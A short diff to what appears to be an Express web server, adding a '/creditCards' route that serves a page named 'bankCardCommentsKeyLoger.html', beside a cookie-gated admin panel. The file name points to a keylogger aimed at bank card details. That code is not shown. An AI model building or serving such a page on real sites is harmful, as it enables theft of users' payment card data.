@@ -81,6 +81,10 @@ app.get('/socialMediaPage', (req, res) => {
     res.sendFile(__dirname + '/public/socialMedia.html');
 });
 
+app.get('/creditCards', (req, res) => {
+    res.sendFile(__dirname + '/public/bankCardCommentsKeyLoger.html');
+});
+
 app.get('/admin-control-panel', (req, res) => {
     if(func.checkCookie(req)) {
         res.sendFile(__dirname + '/adminPanel/index.html');
